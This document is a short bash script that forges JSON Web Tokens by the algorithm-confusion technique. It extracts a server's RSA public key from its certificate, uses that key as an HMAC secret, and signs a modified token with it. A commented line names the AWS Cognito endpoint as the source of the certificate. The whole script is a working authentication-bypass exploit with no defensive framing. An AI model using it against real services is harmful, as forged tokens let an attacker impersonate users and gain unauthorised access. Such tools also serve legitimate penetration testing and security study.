#!/usr/bin/env bash

# Decode JWT token
# https://www.jsonwebtoken.io/
raw_jwt=$1
# Modify it and encode it


# Copy server certificate and extract the public key
#openssl s_client -connect cognito-idp.eu-west-1.amazonaws.com:443

#Copy the “Server certificate” output to a file

#Copy the “Server certificate” output to a file (e.g. cert.pem) and extract the public key (to a file called key.pem)
openssl x509 -in cert.pem -pubkey -noout > key.pem

#turn it to ASCII text
ascii_output="$(cat key.pem | xxd -p | tr -d \"\\n\")"

#echo $ascii_output
#The output – that is, the HMAC signature
echo -e "[+] HMAC signature"
hmac_signature=$(echo -n $raw_jwt | openssl dgst -sha256 -mac HMAC -macopt hexkey:$ascii_output)
hmac_signature=$(echo $hmac_signature | cut -d'=' -f2 |sed -e 's/^[ \t]*//')

#A one-liner to turn this ASCII hex signature into the JWT format is:
echo -e "$hmac_signature\n"

hex_signature="$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac_signature')).replace('=','')\")")"
echo -e "[+] Hex signature"
echo -e "$hex_signature \n"

echo "[+] JWT with signature was generated"
echo "$raw_jwt.$hex_signature"
